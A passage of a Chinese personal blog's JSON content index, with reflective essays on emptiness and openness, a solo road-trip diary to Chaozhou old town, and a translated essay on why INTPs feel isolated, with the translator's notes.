我问过很多人这个问题。最近有一天，我得到一个诚实的答案，“我有时觉得空虚”。无论你尝试获得什么，本质上是你觉得缺少。这等于没有回答，但又是一个无比正确的答案。你感受不到那种本自具足，所以你寻找，而如果你感受到了，那么死亡就不遥远了。“我觉得空虚”，这里没有花里胡哨的故事，没有自欺欺人的说法，直击灵魂，直抵人心。也许，填补空虚，期待理解，需要认可，想要赞同，就和觉得饥饿，感到口渴，想要大号，急需小便一样，就是真相本身，就是事物本来，并不高尚，也不卑劣，既不光荣，也不可耻。无需探究背后有什么，探究也不会有结果，无非是找到更多的说法，但也不过是说法，因为背后，没什么特别。继续解构下去，就是生化反应，这对于让你理解一切，更好在其中运转下去，有什么好处吗？没有多少，收益极低，徒增烦恼。\n反思与改进 思维活跃者适合在散步中交谈，大部分人适合在咖啡屋里交谈。我其实还是不够坦诚，不敢完全直面自己，希望以后能慢慢改进。\n走向开放世界 从前我有很多想法，但几乎从不开口，倒是写了不少日记。这不太好。哪怕是这个小小的公众号，也有读者觉得我翻译的某篇文章不错，私信说希望能继续翻译该系列的后续文章，也有读者给我的文字打赏，这都让我挺开心，觉得生活有所期待，有些事情值得一做，郁郁寡欢之中也多了一丝能量。所以我还是觉得，人必须走向开放。就像对话为思想注入变量一样，开放为生活注入变量。走向开放的唯一方式是行动，移动、发言、观察、领悟、模仿、挑战，做任何克服停滞的行动。世界会像一场无限游戏不断展开，而你会走向前所未见的境地。这一切，就是生活。","title":"谈进步"},{"content":" 你吃饱喝足，见多识广，你独一无二，是这残酷世界的幸运儿。\n你反复确认价值，寻求理解，你独舞无言，是这美丽世界的孤儿。\n你喜怒哀乐，絮絮叨叨，你爱与被爱，但常常无法真正感到满足。\n在自我之外你拥有得太多甚至过多了，唯独自我，模糊不清，模棱两可。\n你在探索，却不知真正想发现什么，你在尝试突破，却没能真正突破什么。\n你想看看别人眼中的世界，你想谈论一切，谈论生活、自我、勇气、孤独、死亡、性爱、成长、婚姻、表达，但没有办法想谈就谈。\n你来到这里，然后哭着说“原来我好棒”、“你是世另我”，笑着说“我一般不哭”、“你真的不错”。\n世上的拧巴千奇百怪，却也大同小异，你很特别，却也没有那么特别，你想要的很多，真正需要的却也很少。\n我总在问，背后是什么？也许答案是，背后没什么，你就是一切。\n-\u0026ndash;\n一些其他感受\n人类个体之间，尤其女性之间，的情感某些时刻真是纯粹而动人。 这类活动展现了都市文明的一个璀璨而极有意义的分支。 情绪对于生活的重要性，并不低于理性。 无论人们生活如何，对于寻找自我的渴望永不停息。 一次见到这么多有意思的人，竟获得一种奇异的平静，或许正合“参差多态乃是幸福之源”。 ","permalink":"https://ret2neo.cn/mind/221106-whatif-youth-lab/","summary":" 你吃饱喝足，见多识广，你独一无二，是这残酷世界的幸运儿。\n你反复确认价值，寻求理解，你独舞无言，是这美丽世界的孤儿。\n你喜怒哀乐，絮絮叨叨，你爱与被爱，但常常无法真正感到满足。\n在自我之外你拥有得太多甚至过多了，唯独自我，模糊不清，模棱两可。\n你在探索，却不知真正想发现什么，你在尝试突破，却没能真正突破什么。\n你想看看别人眼中的世界，你想谈论一切，谈论生活、自我、勇气、孤独、死亡、性爱、成长、婚姻、表达，但没有办法想谈就谈。\n你来到这里，然后哭着说“原来我好棒”、“你是世另我”，笑着说“我一般不哭”、“你真的不错”。\n世上的拧巴千奇百怪，却也大同小异，你很特别，却也没有那么特别，你想要的很多，真正需要的却也很少。\n我总在问，背后是什么？也许答案是，背后没什么，你就是一切。\n-\u0026ndash;\n一些其他感受\n人类个体之间，尤其女性之间，的情感某些时刻真是纯粹而动人。 这类活动展现了都市文明的一个璀璨而极有意义的分支。 情绪对于生活的重要性，并不低于理性。 无论人们生活如何，对于寻找自我的渴望永不停息。 一次见到这么多有意思的人，竟获得一种奇异的平静，或许正合“参差多态乃是幸福之源”。 ","title":"如果青年36h生活实验室·勇气篇"},{"content":" “京城帝王府，潮州百姓家”，此行的目的地是潮州古城。\n1023下午14时从深圳出发，1024晚上20时回到深圳，总行程约 800 公里，耗时30小时，途经惠州，潮州，汕头，揭阳等城市。\n此行完成后，高德显示，我要路过的一百个城市，已完成约四分之一。\n论即兴旅行\n从产生念头到出发大约一天时间。\n计划好的旅程是一次完成，无准备的出发则是一次创作。\n莽撞出发和谋划不周带来的挫败和不便不可避免，意料之外的相遇却也令人欣喜。此行见到了长街无人的牌坊街，飞檐走壁的大白猫，空无一人的韩江长廊和上水城门，我发现自己还是很喜欢在人少的时候逛景点的，换个时空，悠哉游哉。某种程度上，我也相信命运的发展同一次旅程一样，随机碰撞之中有其不可言说的脉络。\n论独行\n出发前问了一些朋友，也在公司论坛发了帖，但没有找到有兴趣同行的人。一位朋友说他早些年也一个人做很多事情，受此鼓舞最终决定还是出发。在这个阶段，我是一个受激情驱动的人，可以在没有太多计划的情况下开始做一个事情。对大部分人来说，确定性带来安全感，对我来说，更喜欢挖掘不确定性中的机会和灵感。《在路上》写道“在我心目中，真正的人都是疯疯癫癫的， 他们热爱生活，爱聊天，不露锋。希望拥有一切，他们从不疲倦，从不讲些平凡的东西”，我容易疲倦，但在我不那么疲倦的时候，还是蛮希望能遇到些疯疯癫癫不拘一格随心所欲的人的，不知哪儿有这样的人？我们似乎没有真正的垮掉的一代，大家都是垮了，但没完全垮，我们少点儿真正垮掉的勇气。\n我是被迫一个人出发的，虽然一个人行动不会分神，可以专心思考和感受，行动起来也是行止由心，高兴就多看点，emo了就原地蹲着，下雨了车里躲着，天晴了就风里走走，也算自由自在。但一个人的坏处也是很明显的，有好吃的不太好各来一份，有好的想法和感受也没人可以分享只能自己记下来，漆黑的夜路上也难免会有几分孤单，而且缺少人与人之间情绪和感性的滋养，日子久了神性渐多而人性渐少未必是好事。虽说人生路归根结底是一个人走，但有一个有一定默契，互相满意，携手同行的伴侣还是一件幸事。也不知道我的馅饼啥时候掉下来。\n论无目的\n生活中的一切都充满目的，真正无目的的事情很少。无目的的行动看起来又呆又傻，那种“向前走，就是要走”的执拗不知是积极虚无主义的实践方式还是无处可去的自我麻痹，抑或是两者并无不同。有人问起为什么去潮州古城，我也不知怎么回答。其实可以是任何地方，只是我打开马蜂窝刚好看到潮州古城，仅此而已。不去这里，我也会去那里，今天不走，明天也会走。为什么走，我不知道，想发现什么吗，想体验什么吗，想探索什么吗，很难说清。可以简单人云亦云地说想吃潮汕美食，想看古城建筑，或者其他的什么，也许是，也不是，或者说，不尽然。也许我是想换个时空感受什么，也许我只是想找点事情麻痹一下，也许我想看看古人所谓行万里路是在行些什么，也许我想知道，一个人的本性是发展出来的还是发挥出来的，也许我想在行路中发现自己，认识自己，或者塑造自己，发展自己，都有可能，也可能都不是。说不清，也许没有什么目的，难道不可以做没有目的的事情吗，难道世事的为什么都有答案吗？只是出发，没有什么目的。有收获也好，没有也度过不错的一天，这也足矣。\n论无计划\n古人云，凡事预则立不预则废，实在是非常有道理的。但我还不太会做计划，缺少办成事情的经验，大多计划和想法带些莽撞、想当然和欠考虑。我可以自我安慰不确定性中藏有机遇和灵感，但事实是，如果有人同行，我不太能非常地照顾好他们的需求。所以在某种程度的成熟达成以前，我还是适合独行。\n论生活方式\n古城里面的机车姑娘和电驴情侣们确实给了我一些触动。世人的生活方式千姿百态，慢节奏的生活是如此惬意。每个人习惯于自己那个版本的世界的节律和规则，而很容易误以为世界就是这么运转的。多跳出来看看，会发现你所在意和执着的可能并不是那么重要，最终来说，你在忙忙碌碌之余，要回答的问题是，自己想要的是什么样的生活，自己想要怎样去度过时间，然后就是自己是否在按照想要的方式生活，如果没有，又是为什么，有什么是可以去做的。凡此种种，切换时空，见到千人千面时我会忍不住去想，也许这边是旅行的益处之一。\n论顺风车\n其实不挣钱，三百公里收益160+元，只是高速路费而已。接到什么样的客人全凭运气。而且只是想找个人聊天而已，忽然之间变成了服务者，他大咧咧坐在后排，我成了司机，这种感觉有些不适。虽然人家付费了，但又不是打车，大家应该更平等一点儿。如果我以后搭顺风车，如果对方乐意，一定坐在前排。\n记流水账\n出发前先来一碗潮汕牛杂面和油炸香芋条热身。\n两点出发，独自开始370公里的行程，目的地是前一晚临时定的酒店。到达之后的行程并未规划。这会损失游玩的效率，但符合我的本性，让我们看看会发生什么吧。有了云南之行中的某一天开了八百公里的经历，对完成这370公里还是蛮有信心的。\n今天随机的是许嵩的歌，似乎只有他才能大部分歌曲经得起重复播放，而不会觉得聒噪。谁能想到《断桥残雪》已经是十五年前的歌曲了呢？《庐州月》旋律响起的时候总是让我想起中学时候在玩一款叫《让子弹飞》的小游戏时候的惬意，岁月呼啸，时光不复，每一天都只有一次，心心念念期待着的日子总会到来，到来之后就会很快过去，过去以后就是永不再发生。生活的残酷和美妙都在于此。《河山大好》响起的时候，恩……，很应景。\n服务区充个电，和旁边的大哥聊了会儿，他去揭阳，车是纯电的，很有续航焦虑。\n服务区打卡加一：金灶服务区。解锁新功能“定速巡航”的我现在觉得开高速是一种享受，除了眼睛有点酸之外一点儿不觉得累。继续出发。\n六点半，天黑下来了\n夜里七点半，下高速\n小城好多小摩托，大家好像都很快乐。\n在拥挤的小巷子中兜了一会儿，进了开元寺旁边的一个停车场之后又出来了，绕了潮州古城大半圈也没找到停车的地方，好不容易在一个不那么繁华的街上的路边停下来以后，天空又下起了毛毛雨，上街闲逛也变得兴味索然，只好回到车上。此时肚子开始饿了，步行能到的距离又没有搜到值得一吃的店家。于是只好回酒店。\n疲乏的劲头上来了，完全不想动，在酒店点了个外卖。肠粉加香菇是画龙点睛，饺子的肉馅很足，皮则太厚，沙茶酱有点儿腻，肉丸中规中矩。\n一番碳水下肚，又来了精神。刚好奶茶错送到了隔壁的“盛世知足”，下楼去取。我一进门足道的小姐姐似乎就知道我是来取奶茶的。喝上半杯还不觉得腻的才是好奶茶，显然今天点到的不是。大街小巷地闲逛，理发店多得有点儿奇怪了。\n“得闲饮啡”，真有意思。\n临时起意还是要去牌坊街看看，打车前往。的哥的口音听着很像家乡话，聊了会儿才知原来只是本地人。他还告诉我本地人大多是摩托车出行的，因为路太小，摩托车也是油车居多，电车反而比较少。还有就是附近确实不好停车，如果有机会再来还是先在别处找个地方停。\n半夜十一点半，来到潮州古城某个门，人流已经比八点多时候看到的少了很多。\n往里走还是有1/4左右的店开着\n青史留名，大约如此。这些名字也许做过不少事情，有过不少故事，也许在某些历史时刻里在某些人那儿震耳欲聋，但在我看来只是符号，我不care，我想也没有多少人care。如今他们只是一处景观，是长街一隅，无数牌坊中的一座，喧嚣夜市的背景而已。历史虚无主义荼毒我竟至于此，但没有办法，现在就是这么个认识。\n诚然，十相留声，不如人间烟火。\n司徒世家，不过门庭冷落。人们来此，谁看司徒世家，不过是争先恐后整点薯条罢了。\n人相摄影于我，更像是一种浮夸和虚荣。也许是我不懂艺术，也许哪天能接受这些。\n来到了开元寺附近，风格和泉州的开元寺非常接近，甚至某个瞬间让我有些恍惚，不知二者有何渊源。\n这家店附近有很多的小猫咪，相当可爱。我要拍照的时候老板很不好意思地转过身去了。也许我需要一个单反，让人更有在搞艺术的错觉，比用手机看起来不那么冒犯一点。\n路过一家店，但此时已经很饱了。招牌里面都是想吃的，默默记下店名“吉成”，果然有缘，第二天中午回程前就来这里饱餐了一顿。\n牌坊街上有很多抓娃娃的店，但我身旁没有姑娘，就不抓了。\n十一点以后可以开车进来逛，但大约还是走路有意思一点儿。二楼屋檐上有两只白猫飞过，但我没有拍到。\n太平桥。千年前，大约很多人从桥上过吧，那时的街边有小贩吗，都在卖些什么呢？\n道路走到头，现代化的痕迹又回来了\n出城门，到韩江长廊\n凌晨一点十三分，小姐姐在江边直播唱歌。江边逛逛，打车回酒店。\n被子太热半夜醒来。凌晨三点四十，出门加了个餐，街上还有好几家夜宵开着。独行的自由就在于此。\n次日中午一点半，出发回深\n临时决定回牌坊街吃昨晚看到的“吉成”小吃店，这个点街上人也不多。去了小吃店店主推荐的停车场，居然还有充电桩，顺便充上电，然后步行去店里\n途径核酸点，五元一次\n又来了，店里没人\n趁老板娘在下厨到她推荐的店里整点甘草水果\n一人食，整了垂涎已久的糯米涨猪肠，以及咸水粿，无米粿，牛肉丸牛筋丸，各有风味。打包堂食各一部分。\n饱餐后出门，天空不错\n充电刚好满了，年轻人也接上了人生中第一个顺风车的单子，出发去揭阳接人。普宁居然这么近，可惜时间不够了，不然一定去吃个粿汁！\n开车从昨晚走路的门出去了\n又到韩江边，时间仓促，不然一定下车逛\n潮州下次见：）\n接到了顺风车的乘客，可惜了，是个不爱说话的家伙。我当然也要保持专业性，专心开车，不能被发现是第一次接客😂\n四点四十，晚霞非常棒，一切刚刚好\n莲花山服务区，拉着客人，为了保持专业性，不能随便下服务区打卡\n天色渐晚，归心似箭\n送客人回龙岗\n七点多，客人下车了。还是一个人呆着自在点儿。\n小五干饭中……我也去和贤哥干饭，旅程结束\n","permalink":"https://ret2neo.cn/mind/221101-chaozhou-travel-note/","summary":"“京城帝王府，潮州百姓家”，此行的目的地是潮州古城。\n1023下午14时从深圳出发，1024晚上20时回到深圳，总行程约 800 公里，耗时30小时，途经惠州，潮州，汕头，揭阳等城市。\n此行完成后，高德显示，我要路过的一百个城市，已完成约四分之一。\n论即兴旅行\n从产生念头到出发大约一天时间。\n计划好的旅程是一次完成，无准备的出发则是一次创作。\n莽撞出发和谋划不周带来的挫败和不便不可避免，意料之外的相遇却也令人欣喜。此行见到了长街无人的牌坊街，飞檐走壁的大白猫，空无一人的韩江长廊和上水城门，我发现自己还是很喜欢在人少的时候逛景点的，换个时空，悠哉游哉。某种程度上，我也相信命运的发展同一次旅程一样，随机碰撞之中有其不可言说的脉络。\n论独行\n出发前问了一些朋友，也在公司论坛发了帖，但没有找到有兴趣同行的人。一位朋友说他早些年也一个人做很多事情，受此鼓舞最终决定还是出发。在这个阶段，我是一个受激情驱动的人，可以在没有太多计划的情况下开始做一个事情。对大部分人来说，确定性带来安全感，对我来说，更喜欢挖掘不确定性中的机会和灵感。《在路上》写道“在我心目中，真正的人都是疯疯癫癫的， 他们热爱生活，爱聊天，不露锋。希望拥有一切，他们从不疲倦，从不讲些平凡的东西”，我容易疲倦，但在我不那么疲倦的时候，还是蛮希望能遇到些疯疯癫癫不拘一格随心所欲的人的，不知哪儿有这样的人？我们似乎没有真正的垮掉的一代，大家都是垮了，但没完全垮，我们少点儿真正垮掉的勇气。\n我是被迫一个人出发的，虽然一个人行动不会分神，可以专心思考和感受，行动起来也是行止由心，高兴就多看点，emo了就原地蹲着，下雨了车里躲着，天晴了就风里走走，也算自由自在。但一个人的坏处也是很明显的，有好吃的不太好各来一份，有好的想法和感受也没人可以分享只能自己记下来，漆黑的夜路上也难免会有几分孤单，而且缺少人与人之间情绪和感性的滋养，日子久了神性渐多而人性渐少未必是好事。虽说人生路归根结底是一个人走，但有一个有一定默契，互相满意，携手同行的伴侣还是一件幸事。也不知道我的馅饼啥时候掉下来。\n论无目的\n生活中的一切都充满目的，真正无目的的事情很少。无目的的行动看起来又呆又傻，那种“向前走，就是要走”的执拗不知是积极虚无主义的实践方式还是无处可去的自我麻痹，抑或是两者并无不同。有人问起为什么去潮州古城，我也不知怎么回答。其实可以是任何地方，只是我打开马蜂窝刚好看到潮州古城，仅此而已。不去这里，我也会去那里，今天不走，明天也会走。为什么走，我不知道，想发现什么吗，想体验什么吗，想探索什么吗，很难说清。可以简单人云亦云地说想吃潮汕美食，想看古城建筑，或者其他的什么，也许是，也不是，或者说，不尽然。也许我是想换个时空感受什么，也许我只是想找点事情麻痹一下，也许我想看看古人所谓行万里路是在行些什么，也许我想知道，一个人的本性是发展出来的还是发挥出来的，也许我想在行路中发现自己，认识自己，或者塑造自己，发展自己，都有可能，也可能都不是。说不清，也许没有什么目的，难道不可以做没有目的的事情吗，难道世事的为什么都有答案吗？只是出发，没有什么目的。有收获也好，没有也度过不错的一天，这也足矣。\n论无计划\n古人云，凡事预则立不预则废，实在是非常有道理的。但我还不太会做计划，缺少办成事情的经验，大多计划和想法带些莽撞、想当然和欠考虑。我可以自我安慰不确定性中藏有机遇和灵感，但事实是，如果有人同行，我不太能非常地照顾好他们的需求。所以在某种程度的成熟达成以前，我还是适合独行。\n论生活方式\n古城里面的机车姑娘和电驴情侣们确实给了我一些触动。世人的生活方式千姿百态，慢节奏的生活是如此惬意。每个人习惯于自己那个版本的世界的节律和规则，而很容易误以为世界就是这么运转的。多跳出来看看，会发现你所在意和执着的可能并不是那么重要，最终来说，你在忙忙碌碌之余，要回答的问题是，自己想要的是什么样的生活，自己想要怎样去度过时间，然后就是自己是否在按照想要的方式生活，如果没有，又是为什么，有什么是可以去做的。凡此种种，切换时空，见到千人千面时我会忍不住去想，也许这边是旅行的益处之一。\n论顺风车\n其实不挣钱，三百公里收益160+元，只是高速路费而已。接到什么样的客人全凭运气。而且只是想找个人聊天而已，忽然之间变成了服务者，他大咧咧坐在后排，我成了司机，这种感觉有些不适。虽然人家付费了，但又不是打车，大家应该更平等一点儿。如果我以后搭顺风车，如果对方乐意，一定坐在前排。\n记流水账\n出发前先来一碗潮汕牛杂面和油炸香芋条热身。\n两点出发，独自开始370公里的行程，目的地是前一晚临时定的酒店。到达之后的行程并未规划。这会损失游玩的效率，但符合我的本性，让我们看看会发生什么吧。有了云南之行中的某一天开了八百公里的经历，对完成这370公里还是蛮有信心的。\n今天随机的是许嵩的歌，似乎只有他才能大部分歌曲经得起重复播放，而不会觉得聒噪。谁能想到《断桥残雪》已经是十五年前的歌曲了呢？《庐州月》旋律响起的时候总是让我想起中学时候在玩一款叫《让子弹飞》的小游戏时候的惬意，岁月呼啸，时光不复，每一天都只有一次，心心念念期待着的日子总会到来，到来之后就会很快过去，过去以后就是永不再发生。生活的残酷和美妙都在于此。《河山大好》响起的时候，恩……，很应景。\n服务区充个电，和旁边的大哥聊了会儿，他去揭阳，车是纯电的，很有续航焦虑。\n服务区打卡加一：金灶服务区。解锁新功能“定速巡航”的我现在觉得开高速是一种享受，除了眼睛有点酸之外一点儿不觉得累。继续出发。\n六点半，天黑下来了\n夜里七点半，下高速\n小城好多小摩托，大家好像都很快乐。\n在拥挤的小巷子中兜了一会儿，进了开元寺旁边的一个停车场之后又出来了，绕了潮州古城大半圈也没找到停车的地方，好不容易在一个不那么繁华的街上的路边停下来以后，天空又下起了毛毛雨，上街闲逛也变得兴味索然，只好回到车上。此时肚子开始饿了，步行能到的距离又没有搜到值得一吃的店家。于是只好回酒店。\n疲乏的劲头上来了，完全不想动，在酒店点了个外卖。肠粉加香菇是画龙点睛，饺子的肉馅很足，皮则太厚，沙茶酱有点儿腻，肉丸中规中矩。\n一番碳水下肚，又来了精神。刚好奶茶错送到了隔壁的“盛世知足”，下楼去取。我一进门足道的小姐姐似乎就知道我是来取奶茶的。喝上半杯还不觉得腻的才是好奶茶，显然今天点到的不是。大街小巷地闲逛，理发店多得有点儿奇怪了。\n“得闲饮啡”，真有意思。\n临时起意还是要去牌坊街看看，打车前往。的哥的口音听着很像家乡话，聊了会儿才知原来只是本地人。他还告诉我本地人大多是摩托车出行的，因为路太小，摩托车也是油车居多，电车反而比较少。还有就是附近确实不好停车，如果有机会再来还是先在别处找个地方停。\n半夜十一点半，来到潮州古城某个门，人流已经比八点多时候看到的少了很多。\n往里走还是有1/4左右的店开着\n青史留名，大约如此。这些名字也许做过不少事情，有过不少故事，也许在某些历史时刻里在某些人那儿震耳欲聋，但在我看来只是符号，我不care，我想也没有多少人care。如今他们只是一处景观，是长街一隅，无数牌坊中的一座，喧嚣夜市的背景而已。历史虚无主义荼毒我竟至于此，但没有办法，现在就是这么个认识。\n诚然，十相留声，不如人间烟火。\n司徒世家，不过门庭冷落。人们来此，谁看司徒世家，不过是争先恐后整点薯条罢了。\n人相摄影于我，更像是一种浮夸和虚荣。也许是我不懂艺术，也许哪天能接受这些。\n来到了开元寺附近，风格和泉州的开元寺非常接近，甚至某个瞬间让我有些恍惚，不知二者有何渊源。\n这家店附近有很多的小猫咪，相当可爱。我要拍照的时候老板很不好意思地转过身去了。也许我需要一个单反，让人更有在搞艺术的错觉，比用手机看起来不那么冒犯一点。\n路过一家店，但此时已经很饱了。招牌里面都是想吃的，默默记下店名“吉成”，果然有缘，第二天中午回程前就来这里饱餐了一顿。\n牌坊街上有很多抓娃娃的店，但我身旁没有姑娘，就不抓了。\n十一点以后可以开车进来逛，但大约还是走路有意思一点儿。二楼屋檐上有两只白猫飞过，但我没有拍到。\n太平桥。千年前，大约很多人从桥上过吧，那时的街边有小贩吗，都在卖些什么呢？\n道路走到头，现代化的痕迹又回来了\n出城门，到韩江长廊\n凌晨一点十三分，小姐姐在江边直播唱歌。江边逛逛，打车回酒店。\n被子太热半夜醒来。凌晨三点四十，出门加了个餐，街上还有好几家夜宵开着。独行的自由就在于此。\n次日中午一点半，出发回深\n临时决定回牌坊街吃昨晚看到的“吉成”小吃店，这个点街上人也不多。去了小吃店店主推荐的停车场，居然还有充电桩，顺便充上电，然后步行去店里\n途径核酸点，五元一次\n又来了，店里没人\n趁老板娘在下厨到她推荐的店里整点甘草水果\n一人食，整了垂涎已久的糯米涨猪肠，以及咸水粿，无米粿，牛肉丸牛筋丸，各有风味。打包堂食各一部分。\n饱餐后出门，天空不错\n充电刚好满了，年轻人也接上了人生中第一个顺风车的单子，出发去揭阳接人。普宁居然这么近，可惜时间不够了，不然一定去吃个粿汁！\n开车从昨晚走路的门出去了\n又到韩江边，时间仓促，不然一定下车逛\n潮州下次见：）\n接到了顺风车的乘客，可惜了，是个不爱说话的家伙。我当然也要保持专业性，专心开车，不能被发现是第一次接客😂\n四点四十，晚霞非常棒，一切刚刚好\n莲花山服务区，拉着客人，为了保持专业性，不能随便下服务区打卡\n天色渐晚，归心似箭\n送客人回龙岗\n七点多，客人下车了。还是一个人呆着自在点儿。\n小五干饭中……我也去和贤哥干饭，旅程结束","title":"即兴旅行：潮州古城"},{"content":" 本文译自：http://www.intpexperience.com/Isolation.php\n域名已过期，可以使用cache查看：https://web.archive.org/web/20230219221929/www.intpexperience.com/Isolation.php\n第一章：为何我感到疏离？（译文） 当我阅读 INTP 们的对话，我发现一种奇特的共性，INTP 们感到自己和他人疏离、不同、缺少连接。\n我还注意到分析和理解清楚这个问题的根因对 INTP 们来说不容易。尽管我们擅长通过应用逻辑和结构化思维来理解和探索世界，但这个问题看起来超出我们的洞察力范围了。每次当我们快抓住它的时候，它就从指间溜走。事实上，我们甚至很难成功定义这个问题的边界，更别提发现终极解决方案了。\n迎难而上，我决定从探索这个难题开始 INTP 系列文章。我们的 INTP 本质应对其他个体的方式究竟是如何使我们感受到这种奇怪而难以定义的疏离呢？\n首先，请注意我说的是“感受”。众所周知，INTP 在整个和感情有关的问题上都是苦手。我们的内向感觉认知功能很菜，这是一种根据我们对自己的感觉，建立起一种清晰、持久的自我认同的能力。我们是被思考而不是情绪驱动的。举例来说，如果我们对世界的理解将我们引向一个结论：我们是 X 类型的人，那就意味着我们会认为自己就是 X 类型的人。我们的感觉会追随这个思考做出的决定。如果随后，我们又找到自己是 Y 类型人的证据，然后我们就会认为自己是 Y 类型人，对自己的感觉总会跟着思考的结果走。我们的自我认同就是这么容易发生改变。我们没有那种天生就知道自己是哪种类型的人的能力，我们为自己是谁寻找证据，然后基于分析决定自己是谁。如果自我认同频繁改变，就会有点危险，生活可能因此发生巨变。在生活的风浪中航行，有强大的情感作为锚固是有益的，不然 INTP 很容易被吹到礁石上。\n因为我们自己的情绪显得可疑，并且我们总是忽视它，所以我们难以理解，在他人身上情绪的重要性、影响力和可变性。我们的外向感觉功能处于劣势，所以他们最后发展。总的来说，当我们年轻的时候，理性强烈压制着情绪，当情绪爆发的时候，它们是可怕夸张而不受控的。伴随着成长，我们会锻炼自己的感觉能力，这是个痛苦不适的过程，我们从犯错、从对自我和他人的观察中学习和成长。经过年复一年的自我挣扎，漫长而艰辛的试图分析与理解，年逾不惑的我觉得自己可以给年轻的 INTP 们提供一些关于如何在社会中立身的见解了。\n任何人最难量化的感觉：感觉“正常”。 最困难的一种自我意识是准确理解我们日常生活中的“正常”是怎样的。例如，你并没有真正考虑呼吸的许多细微差别，大部分时候呼吸都很自然地发生。只有当呼吸不正常的时候你才会意识到它。当更强烈的感受被激发时，你的生物本能会让你记住。比如你会记得窒息，但不会记得过去五分钟的呼吸。\n生物层面，我们对可怕的事物印象最深，然后是美妙的事物，最后才是正常的事物。事实上，这是生存的有效策略。法则一，别受伤或死掉。法则二，找到好东西并享受。法则三，时不时干点无聊的事情。挑战在于跳出习以为常进行敏锐的观察。注意到异常点是容易的，在惯性行为中解构每个步骤的细节是困难的。\n对 INTP 来说像“呼吸”一样正常的事情。 当 INTP 醒来开始新的一天，走出门时，什么是自然而然，会像呼吸一样去做的事情呢？\n有些人格类型经过磨炼、练习和激发来增强规则，他们是守护者。有些渴望看到每天会发生什么并寻找机会来度过好时光，他们是工匠。有些沉迷于寻找意义，他们是理想主义者。INTP 是其中之一。INTP 时刻准备着识别、分析理解和预测世界的运作方式。\n这是一个内在的、个人化的精神世界的过程。总体上，INTP 每天收集信息信息，将他们放进一个全面的、不断发展的关于一切的认知体系当中。信息可以是关于任何事物的，这个过程本身比关注的主题更重要。如果我们观察到 X 情况下 Y 行为会导致 Z，我们会记住这一点。如果我们又观察到，我们会记住已经见过两次这个证据。如果我们第三次观察到，我们可能决定自己发现了一个潜在真理（除非将来出现新的信息证明这个结论需要修正，否则这是一个真理）。每个真理都是一个预测器。如果在见到 X 条件下发生 Y 行为，我们就可以期望 Z 结果。如果我们成功地正确预测了 Z，我们就会觉得很棒。这带来一种正确、正常的感觉。\n当我们积累了足够多的真理来预测很多事情时，周围人就会注意到我们。我们会看起来有洞见、有智慧，甚至有时候能通灵。当我年轻时，我常常能听一个人说几句话就猜到他的观点。当我能够正确回答他们的问题或者对他们的观点做出反应时，他们会惊掉下巴。预测源于我对这个人的了解，对先前对话的了解，刚发生的可能触发他们想法的事件，暗示对话发展方向的词汇 。完成一次成功的预测就像是完成了理解，这对 INTP 来说很棒。\n这种收集信息、形成结构和预测世界的动力渗透到 INTP 所做的一切事情中。对大多数人来说，我刚才描述的事情听起来精疲力竭，甚至有些病态。但如果你是 INTP，我相信这个过程对你就像呼吸一样自然。你甚至意识不到自己在这样做。这个过程是我们在世界上寻找意义和自我定位的方式，这让我们感到放松，有控制感和冷静。\nINTP 的百科全书 某种意义上，INTP 出生时就带来一本空白的百科全书，INTP 们终其一生就是为了填满这本书。不是从头到尾填的，而是东一笔西一笔旁逸斜出地填，最终如果足够幸运，在人生尽头大部分空白会被填满。\n每一天，INTP 拿着这本百科全书四处晃悠，时刻准备着记录新观点，修正旧观点，或者使用观点来预测。它也可以在聚会上被拿出来引发有趣的对话或者包装成幽默。INTP 可以是非常迷人和有魅力的，为那些喜欢琐事、哲学和其他即兴对话的人提供无尽的娱乐。\n你注意到我用的词了吗？娱乐。\n是的，如果你的百科全书够大，你可能非常了解我在说什么。但娱乐之后很快你会觉得生气。这有些分裂，为什么呢？当你去看表演时，观众是观众，演员是演员，泾渭分明。观众只想找点乐子，然后回家。\nINTP 们使用魅力、幽默和谈话作为一种策略来拉近人们的距离并进行社交互动。随着你长大一些，你会明白这没有用。我们得不到渴望的亲密感，反而被指示在演出结束时从舞台左侧的门离开。\n然而，我们这样使用自己的百科全书是因为我们实在不知道还能用来干啥。这就是我们感受他人的方式。他们是否对我们脑中的天马行空感兴趣？他们是否在意我们的观察和理解？他们是否有相似的想法？能用我所学帮助他们吗？他们能帮助我吗？\n幽默是社交的有力工具，幽默是智力的体现。他们有没 get 到点？他们能接梗吗？我们在心里期望着。当期望落空，我们会被当作怪物拒绝，或者当作小丑被用作娱乐。对那些参加过当晚专题演讲的人来说，这可能很棒，但你的另一部分会觉得没意思。如果你被利用然后被抛弃，至少他们应该付你钱。\n你好，有人在吗？ 所以为何我们常常觉得无法融入他人？为何和人亲密如此困难？为何一旦觉得自己在靠近，就开始重新觉得疏离呢？\n一方面，原因非常简单。不简单的是我们内在发生的微妙的心理和情感化学反应，导致那种难以驾驭的感觉。毕竟，没有人能让我们感受到任何东西。我们的感觉源自自我之内，他人只是我们投射情感的目标，我们可以往任何其他人身上投射。（译者注：这可能是我们不需要其他人的原因，我们无法亲近其他人的原因。但亲近是双向的，你不渴望特定的人是 OK 的。但这种个性不是你不被其他人渴望的根因。不被他人渴望的根因是这种自我中心让我们并不在意其他人，不会去照顾别人的感情和需要，所以最终，没有人真正喜欢和亲近你，大家最多觉得你酷，但没有任何想和你更亲近的想法，因为你无法付出情感，无法让人感受到你的情感，从你身上他们无法感知到一种亲近。那么，总的来说，亲近就无法发生。）\n所以，让我们再回到 INTP 的“正常”。这就是问题所在。我们甚至都没意识到自己在辛勤地填写那本百科全书，我们自己习惯性地去做。并且和所有人一样，我们天然觉得所有人都以和自己一样的方式思考和行动。我们有一条黄金法则，以我们希望被对待的方式去对待别人，就会得到好的回应。是这样的吗？（译者注：改变的第一点是，意识到别人没有百科全书也能活，在世界上追求一种解释是没有什么价值的。事物的原理你也并不总是需要了解，活着就好了。简单自然，投入真情。理论原理可有可无，没有不停地填写百科全书的人反而活得更好。你想要的只是一个抓手，一个执念，一种很深的妄想，一种追求控制感的病态，你要做的是随波逐流，放弃挣扎。放空内心，让情感涌进来，不要问为什么，不要当好奇宝宝，然后很快，你就正常了。不要不甘心，你能对世界有什么很高明的预测呢，你能做出的最准确的预测就是一切人都会死掉。所以，不必惊惶，不必沉迷，不必执着，不必求索。一切就是这样，从来如此，从古至今，你不必追问。然后，你很自然就痊愈了，当然也失去了你最开始的灵性和好奇，但这就是代价，你选择怎样的药丸？）\n不，很遗憾，常常并非如此。\n他们也有黄金法则，不过是他们的那个版本。他们想要的是截然不同的东西。当他们想要梨子，你却给了个苹果，或者相反。\nINTP 占人群的 2%，女性 INTP 